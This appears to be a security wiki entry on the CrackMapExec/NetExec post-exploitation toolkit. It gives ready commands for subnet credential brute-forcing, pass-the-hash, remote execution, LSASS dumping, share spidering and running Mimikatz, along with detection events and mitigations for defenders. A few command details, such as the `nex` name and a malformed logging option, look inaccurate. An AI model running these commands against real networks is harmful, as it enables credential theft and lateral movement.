---
title: CrackMapExec / NetExec
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, python, scanning, post-exploitation, smb, winrm]
---

# CrackMapExec / NetExec

**CrackMapExec (CME)** — now **NetExec** (`nex`, rebranded) — is the Python
**mass scanning + execution** toolkit for Windows networks. It brute-forces,
enumers, and executes across many hosts over SMB, WinRM, LDAP, SSH, and
MSSQL. It's the fast way to validate creds, map local admins, check services,
and push commands/dumps across a fleet — the scanning companion to
[[bloodhound]] (which plans) and [[impacket]] (which does one target deep).

## Protocols / modules

- `smb` — the workhorse: auth checks, local admin enumeration, version/service
  checks, exec, `psexec`/`wmiexec`/`smbexec`, LSASS dumps, share discovery
  (`spider`).
- `winrm` — auth + PowerShell remoting execution.
- `ldap` — domain/user/group enumeration.
- `ssh` / `mssql` — other protocols.
- `psexec` / `wmiexec` / `smbexec` — the exec engines (Kerberos `-k`, hash
  `-hashes`).
- `lsass` — dump LSASS on targets ([[lsass]]).
- `spider` — crawl SMB shares for files (secrets, configs).
- `mimikatz` — push + run Mimikatz on a target.

## Common invocations

```bash
# NetExec (nex) / CrackMapExec (cme) — same syntax family
# Brute / validate creds + local admin check across a subnet
cme smb 10.0.10.0/24 -u user -p 'P@ss' --local-auth
cme smb 10.0.10.0/24 -u user -p 'P@ss' --local-auth -o log results

# Kerberos (ticket) auth
cme smb 10.0.10.5 -u user -p pass -k

# Hash (PtH) auth
cme smb 10.0.10.5 -u user -H <lm>:<nt>

# Exec a command on a host
cme smb 10.0.10.5 -u user -p pass -x 'whoami /all'

# LSASS dump
cme smb 10.0.10.5 -u user -p pass lsass

# Spider SMB shares for interesting files
cme smb 10.0.10.0/24 -u user -p pass spider -r '.*\.(docx?|xlsx?|pdf|csv|txt|json)$'

# Push + run Mimikatz
cme smb 10.0.10.5 -u user -p pass mimikatz
```

## Detection

- **4625 / 4624** — the auth bursts (brute) and successful logons across many
  hosts.
- **SMB connection fan-out** — one source IP touching many hosts' SMB/WinRM is
  a mass-scan tell.
- **4688** — the exec command lines (`whoami`, `secretsdump`, Mimikatz).
- **LSASS access** (Sysmon 10) on targets hit by the `lsass` module.
- **Share enumeration** — SMB share listing bursts (`spider`).

## Mitigations

- **Alert on auth fan-out** — one source hitting many hosts.
- **Restrict SMB/WinRM** to expected sources; enforce signing.
- [[ad-tiering-and-hardening]] — limit what a valid low-priv cred can reach
  (CME with a good cred still only gets what the cred allows).

## Links

- [[bloodhound]] — the planner (CME is the scanner/executor)
- [[impacket]] — the single-target deep tools CME wraps
- [[lsass]] — the `lsass` dump module
- [[pass-the-hash-and-ticket|PtH/PtT]] — the `-H` / `-k` auth modes
- [[crackmapexec]]-adjacent: [[mitm6]] for the network-position attacks

## References

- [NetExec / CrackMapExec](https://github.com/Pennyw0rth/NetExec)
- [NetExec documentation](https://www.netexec.wiki/)
- [ired.team: CrackMapExec](https://www.ired.team/)
